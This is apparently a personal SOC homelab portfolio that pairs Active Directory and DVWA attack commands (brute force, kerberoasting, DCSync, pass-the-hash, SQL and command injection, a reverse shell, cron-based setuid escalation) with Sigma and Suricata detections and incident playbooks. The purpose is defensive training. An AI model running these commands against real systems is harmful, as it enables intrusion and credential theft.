docs.title: Devin's SOC Homelab – Quick Start
docs.text:
This portfolio documents my SOC analyst homelab. It simulates an enterprise network with Active Directory, Security Onion (Zeek + Suricata + Elastic/Fleet/Kibana), and an Ubuntu Webserver. I perform adversary emulation mapped to MITRE ATT&CK, build detection content, and practice incident response.

How to navigate

Use the left Table of Contents to jump to VM Builds, Detections, Attacks (MITRE), and IR Playbooks. Each section is self‑contained with commands and screenshots.

docs.title: Highlights
docs.text:
• Coverage: 9 ATT&CK techniques detected
  • Mean time to detect (MTTD): 3 minutes and 28 seconds
  • Platform: VMware, Windows Server 2025 DC, Windows 11 client, Ubuntu DVWA
  • Monitoring: Security Onion (Kibana dashboards, Sysmon logs, Zeek logs, Suricata alerts), Elastic Agent on endpoints
  • Network: Isolated LAN (192.168.25.0/24)

docs.title: What this project demonstrates
docs.text:
• Hands‑on blue team skills: log collection, detection engineering, triage, and reporting
  • Hands-on red team skills: pen testing Active Directory and web applications
  • Clear documentation & reproducibility for every VM, attack, and detection

docs.title: Active Directory Attack Scenarios (mapped to MITRE ATT&CK)
docs.text: Passwords and hashes have been concealed to retain confidentiality.

docs.title: Brute Forcing Guest Account
docs.text:
• Techniques: T1110.001 (Brute Force: Password Guessing)
  • Procedure:

nxc ldap 192.168.25.137 -u 'Guest' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding

docs.title: Enumerating SMB Shares
docs.text:
• Techniques: T1135 (Network Share Discovery)
  • Procedure:

nxc smb 192.168.25.141 -u 'Guest' -p '_________' --shares

docs.title: ASReproast Domain Account
docs.text:
• Techniques: T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting), T1110.002 (Brute Force: Password Cracking)
  • Procedure:

nxc ldap 192.168.25.137 -u 'Bob' -p '' --asreproast asreproast.txt

john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.txt

docs.title: WinRM Shell with Domain Account
docs.text:
• Techniques: T1078 (Valid Accounts), T1021.006 (Remote Services: Windows Remote Management)
  • Procedure:

evil-winrm -i 192.168.25.137 -u 'bob' -p '_________’

docs.title: Upload of SharpHound
docs.text:
• Techniques: T1021.006 (Remote Services: Windows Remote Management), T1059.003 (Command and Scripting Interpreter: Windows Command Shell)
  • Procedure:

upload SharpHound.exe

docs.title: Execution of SharpHound
docs.text:
• Techniques: T1069.002 (Permission Group Discovery: Domain Groups), T1087.002 (Account Discovery), T1018 (Remote System Discovery), T1482 (Domain Trust Discovery), T1560 (Archive Collected Data)
  • Procedure:

./SharpHound.exe

docs.title: Exfiltration of Data Collected by SharpHound
docs.text:
• Techniques: T1041 (Exfiltration Over C2 Channel)
  • Procedure:

download 20250910173643_BloodHound.zip

docs.title: Kerberoast of svc-test
docs.text:
• Techniques: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting), T1110.002 (Brute Force: Password Cracking), T1078.002 (Valid Accounts: Domain Accounts)
  • Procedure:

nxc ldap 192.168.25.137 -u 'Bob' -p '_________' --kerberoasting kerbroast.txt john --wordlist=/usr/share/wordlists/rockyou.txt kerbroast.txt

docs.title: DCSync
docs.text:
• Techniques: T1003.006 (OS Credential Dumping: DCSync), T1078.002 (Valid Accounts: Domain Accounts)
  • Procedure:

impacket-secretsdump -just-dc LAB/svc-test:'_________'@WIN-LLBIAPV2E9D.lab.local

docs.title: Pass-the-hash to Login as Domain Admin
docs.text:
• Techniques: T1550.002 (Use Alternate Authentication Material: Pass the Hash), T1078 (Valid Accounts), T1021.006 (Remote Services: Windows Remote Management)
  • Procedure:

evil-winrm -i 192.168.25.137 -u 'Administrator' -H '__________________’

docs.title: Web Server Attack Scenarios (mapped to MITRE ATT&CK)
docs.text: Passwords and hashes have been concealed to retain confidentiality.

docs.title: Directory Busting
docs.text:
• Techniques: T1595.003 (Active Scanning: Wordlist Scanning)
  • Procedure:

feroxbuster -u http://192.168.25.142 -w /usr/share/wordlists/dirbuster/directory-list.txt

docs.title: SQL Injection
docs.text:
• Techniques: T1190 (Exploit Public-Facing Application)
  • Procedure:

admin' OR '1'='1--

docs.title: Command Injection
docs.text:
• Techniques: T1059.004 (Command and Scripting Interpreter: Unix Shell)
  • Procedure:

127.0.0.1 && cat /etc/passwd

docs.title: Reverse Shell
docs.text:
• Techniques: T1505.003 (Server Software Component: Web Shell)
  • Procedure:

nc -nvlp 9001

docs.title: Download Linpeas
docs.text:
• Techniques: T1105 (Ingress Tool Transfer)
  • Procedure:

python -m http.server 80 wget http://192.168.25.130:80/linpeas.sh

docs.title: Execute Linpeas
docs.text:
• Techniques: T1082 (System Information Discovery)
  • Procedure:

./linpeas.sh

docs.title: Escalate Privileges Through Cronjob
docs.text:
• Techniques: T1053.003 (Scheduled Task/Job: Cron) T1548.001 (Abuse Elevation Control Mechanism: Setuid/Setgid)
  • Procedure:

echo 'cp /bin/bash /home/bash; chmod +s /home/bash' > /home/report.sh ./home/bash -p

docs.title: Active Directory
docs.text: This section documents custom sigma rules and visualizations for my Active Directory environment. Each item includes the ATT&CK technique, signal logic, and validation evidence.

docs.title: Brute Forcing Guest Account (T1110.001)
docs.text:
Sigma rule (winlog): 

title: 'Multiple Failed Login Attempts in Active Directory'
id: 624d9509-7f05-47e7-932e-078e145a7a42
status: 'stable'
description: 'Detects multiple failed login attempts (Event ID 4625) that may indicate brute forcing against Active Directory.'
author: 'Devin'
date: '2025/10/18'
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4625
condition: selection
level: 'high'

Validation: Ran nxc ldap 192.168.25.137 -u 'Guest' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding; alert fired and triaged.

docs.title: Kerberoast of svc-test (T1558.003 & T1110.002 & T1078.002)
docs.text:
Sigma rule (winlog): 

title: 'TGS Request Not From DC'
id: a85a9ac4-a6be-440a-9b63-46943da0fe36
status: 'stable'
description: 'Indicative of potential kerberoast attack.'
author: 'Devin'
date: '2025/10/18'
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
  name:
    RelatedUser: 'WIN-LLBIAPV2E9D$'
  condition: selection and not name
level: 'high'

Validation: Ran nxc ldap 192.168.25.137 -u 'Bob' -p '_________' --kerberoasting kerbroast.txt; alert fired and triaged.

docs.title: Upload of SharpHound (T1105 & T1047)
docs.text:
Sigma rule (sysmon): 

title: 'SharpHound Uploaded'
id: 6bc8dee8-a7d2-409a-af69-473a9ab94dfa
status: 'stable'
description: 'SharpHound was uploaded through remote management shell'
author: 'Devin'
date: '2025/10/18'
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 11
    Image|endswith : '\wsmprovhost.exe'
    TargetFilename|endswith : '\SharpHound.exe'
condition: selection
level: 'high'

Validation: Ran upload SharpHound.exe from an evil-winrm shell; alert fired and triaged.

docs.title: DCSync (T1003.006 & T1078.002)
docs.text:
Sigma rule (winlog): 

title: 'Active Directory Replication from Non Machine Account'
id: 88e4eb0a-8d72-4164-87d3-d5101e97a3b4
status: 'stable'
description: |
Triggers after Active Directory Replication for a non machine account (indicative of a DCSYNC attack)
author: 'Devin'
date: '2025/10/20'
logsource:
  service: security
  product: windows
detection:
  selection:
    EventID: 4662
    winlog.event_data.ObjectServer: DS
    winlog.event_data.Properties|contains: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
  dc:
    User: WIN-LLBIAPV2E9D$
  condition: selection and not dc
level: 'critical'

Validation: Ran impacket-secretsdump -just-dc LAB/svc-test:'_________'@WIN-LLBIAPV2E9D.lab.local; alert fired and triaged.

docs.title: Pass-the-hash to Login as Domain Admin (T1550.002 & T1021.006)
docs.text:
Sigma rule (sysmon): 

title: 'Admininstrator NTLM Network Login'
id: 6b53b892-2e05-44cd-bcfc-e274ee696ea9
status: 'stable'
description: 'Detects the Administrator account completing an NTLM network login, possibly indicating a pass-the-hash attack'
author: 'Devin'
date: '2025/10/18'
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: '3'
    AuthenticationPackageName: NTLM
    TargetUserName: Administrator
  condition: selection
level: 'high'

Validation: Ran evil-winrm -i 192.168.25.137 -u 'Administrator' -H '__________________’; alert fired and triaged.

docs.title: Dashboard: Successful/Failed Login Attempts Timeline Bar Graph
Dashboard: Windows Remote Management Logins Table
Web Server
docs.text: This section documents custom suricata and sigma rules for my web server. Each item includes the ATT&CK technique, signal logic, and validation evidence.

docs.title: Directory Busting (T1595.0031)
docs.text:
Suricata rule (inline): 

alert http $HOME_NET any -> any any (msg:"WEB-APP possible directory busting"; flow:established,
to_client; http.stat_code; content:"301"; detection_filter:track by_dst, count 15, seconds 10; 
classtype:web-application-attack; sid:100002; rev:2;)

Validation: Ran feroxbuster -u http://192.168.25.142 -w /usr/share/wordlists/dirbuster/directory-list.txt; alert fired and triaged.

docs.title: Reverse Shell Upload (T1105 & T1190)
docs.text:
Sigma rule (inline): 

title: 'Zeek HTTP Transfer of PHP File'
id: 7a2a8618-9b3c-4ace-bd19-270b4277fbbd
status: 'stable'
description: |
Alerts when Zeek logs show an HTTP-served file with MIME type "text/x-php" originating from 192.168.25.142. Useful for spotting potential webshell transfers.
author: 'Devin'
date: '2025/10/27'
logsource:
  service: http
  product: zeek
detection:
  selection:
    file.source: "HTTP"
    server.ip: "192.168.25.142"
    file.mime_type: "text/x-php"
    source.ip: "192.168.25.130"
  condition: selection
level: 'high'

Validation: Uploaded php reverse shell via the web app's file upload feature; alert fired and triaged.

docs.title: Reverse Shell Connection (T1505.003 & T1071.001)
docs.text:
Sigma rule (inline): 

title: 'Zeek Outbound TCP 9001 (Potential PHP Reverse Shell)'
id: 0339b149-5d4e-4b36-8b56-c99be0aab027
status: 'experimental'
description: |
Detects outbound TCP connections to port 9001 in Zeek conn logs, a common default for PHP reverse shells.
author: 'Devin'
date: '2025/10/27'
logsource:
  service: http
  product: zeek
detection:
  selection:
    network.transport: "TCP"
    destination.port.keyword: "9001"
    source.ip: "192.168.25.142"
  condition: selection
level: 'high'

Validation: Ran nc -nvlp 9001 on kali and clicked on the php reverse shell file in the uploads directory; alert fired and triaged.

docs.title: Download Linpeas (T1105)
docs.text:
Suricata rule (inline): 

alert http $HOME_NET any -> any any ( msg:"LINUX linpeas download via wget"; flow:established,
to_server; http.user_agent; content:"Wget/"; nocase; classtype:policy-violation; sid:1157410; 
rev:1;)
Validation: Started python web server on kali and ran wget http://192.168.25.130/linpeas.sh from reverse shell; alert fired and triaged.

docs.title: Playbook: Brute Forcing Guest Account (T1110.001)
docs.text:
• Trigger: Detection rule Multiple Failed Login Attempts in Active Directory fired.
  • Triage: Pivot by user.name : Guest; check for 4624 successes
  • Contain: Block offending IP/range; ensure Guest is disabled.
  • Eradication/Recovery: Scan/isolate source host. Enforce deny-logon for Guests

docs.title: Playbook: Kerberoast of svc-test (T1558.003 & T1110.002 & T1078.002)
docs.text:
• Trigger: Detection rule TGS Request Not From DC fired.
  • Triage: Summarize event.code : 4769 by src/crypto/SPN.
  • Contain: Isolate source; rotate svc-test, deny delegation.
  • Eradication/Recovery: Remove creds/tickets on source

docs.title: Playbook: Upload of SharpHound (T1105 & T1047)
docs.text:
• Trigger: Detection rule SharpHound Uploaded fired.
  • Triage: Pull parent tree; check WinRM activity.
  • Contain: Isolate endpoint; kill SharpHound/PS sessions; reset used creds.
  • Eradication/Recovery: Remove binaries/Zips; restrict/disable WinRM.

docs.title: Playbook: DCSync (T1003.006 & T1078.002)
docs.text:
• Trigger: Detection rule Active Directory Replication from Non Machine Account fired.
  • Triage: Identify account/host; recent 4672/4728 events
  • Contain: Disable the account; isolate source; remove replication perms.
  • Eradication/Recovery: Compromise assessment

docs.title: Playbook: Pass-the-hash to Login as Domain Admin (T1550.002 & T1021.006)
docs.text:
• Trigger: Detection rule Admininstrator NTLM Network Login fired.
  • Triage: Review 4624 details, map source host legitimacy.
  • Contain: Rotate DA creds
  • Eradication/Recovery: Disable built-in DA where possible; alert on DA NTLM Type 3

docs.title: Playbook: Directory Busting (T1595.0031)
docs.text:
• Trigger: Detection rule WEB-APP possible directory busting fired.
  • Triage: Pivot by src
  • Contain: Block or throttle IP/range via WAF
  • Eradication/Recovery: Ensure no follow-on to writable endpoints.

docs.title: Playbook: Reverse Shell Upload (T1105 & T1190)
docs.text:
• Trigger: Detection rule Zeek HTTP Transfer of PHP File fired.
  • Triage: Pivot by user.name : Guest; check for 4624 successes
  • Contain: Block offending IP/range; ensure Guest is disabled.
  • Eradication/Recovery: Ensure no follow-on to writable endpoints.

docs.title: Playbook: Reverse Shell Connection (T1505.003 & T1071.001)
docs.text:
• Trigger: Detection rule Zeek Outbound TCP 9001 (Potential PHP Reverse Shell) fired.
  • Triage: Enumerate related conns; identify owning process/socket on host.
  • Contain: Block egress to dst/port
  • Eradication/Recovery: Kill session/process; remove webshell.

docs.title: Playbook: Download Linpeas (T1105)
docs.text:
• Trigger: Detection rule LINUX linpeas download via wget fired.
  • Triage: Confirm server outbound GET of linpeas.sh with Zeek correlation
  • Contain: Block outbound HTTP from except allowlist; isolate if found/executed.
  • Eradication/Recovery: Remove artifact; sweep /tmp / /var/tmp and check sudo/setuid changes

docs.title: Purpose
docs.text: Active Directory domain services; realistic enterprise authentication/authorization traffic.

docs.title: Specs
docs.text:
• Hostname: WIN-LLBIAPV2E9D.lab.local
  • IP: 192.168.25.137
  • Roles: AD DS, DNS
  • Logging: Sysmon, Windows event forwarding via Elastic Agent
  • 16gb of memory

docs.title: Build Notes
docs.text:
1. Install Server 2025 → promote to new forest lab.local.
  2. Create OUs (Workstations, Users, Service Accounts).

docs.title: Validation
docs.text:
• Join Workstation-A.lab.local to domain:
  • Confirm Kerberos/NTLM events in Kibana: 
    event.code: 4624

docs.title: Purpose
docs.text: Single pane for network + endpoint telemetry; manage Elastic Agent, build alerts/dashboards.

docs.title: Specs
docs.text:
• Ubuntu (Security Onion ISO)
  • NICs: Mgmt 192.168.25.10/24, Sensor-LAN (No IP)
  • 24gb of memory

docs.title: Install (high‑level)
docs.text:
1. Deploy VM from SO ISO → Standalone install.
  2. Assign interfaces: so-mgmt (IP), sensor-lan(No IP).
  3. Enable Fleet/Elastic.

docs.title: Validation
docs.text:
• Confirm Zeek logs arrive in Kibana: 
    event.module : zeek
  • Confirm Suricata alerts: test with Nmap from Kali:
  • Confirm Elastic Agent heartbeats from each VM:
  • Confirm Security Onion containers are up and running: 
    sudo so-status

docs.title: Purpose
docs.text: Intentionally vulnerable web app.

docs.title: Specs
docs.text:
• IP: 192.168.26.10
  • Services: Nginx/Apache, PHP/MySQL, DVWA
  • Security: Minimal hardening
  • Logging: Event forwarding via Elastic Agent
  • 8gb of memory

docs.title: Build Notes
docs.text:
1. Install Ubuntu Server → static IP 192.168.26.10.
  2. Install DVWA stack (web/PHP/MySQL), set DVWA security level to low for testing.
  3. Elastic Agent enrolled; ship nginx/apache, auth, and system logs to Fleet.
  4. Expose via firewall NAT: WAN → 80/443 → 192.168.26.10.

docs.title: Validation
docs.text:
• Confirm Kibana logs: 
    user.name : webadmin
  • Confirm DVWA is up and running: Go to http://192.168.25.142/DVWA

docs.title: Purpose
docs.text: User endpoint targeted for credential theft and lateral movement.

docs.title: Specs
docs.text:
• Hostname: Workstation-A.lab.local
  • IP: 192.168.25.141
  • Logging: Sysmon, Windows event forwarding via Elastic Agent
  • 8gb of memory

docs.title: Validation
docs.text:
• Confirm Kerberos/NTLM events in Kibana: 
    host.name : workstation-a AND event.code : 4624
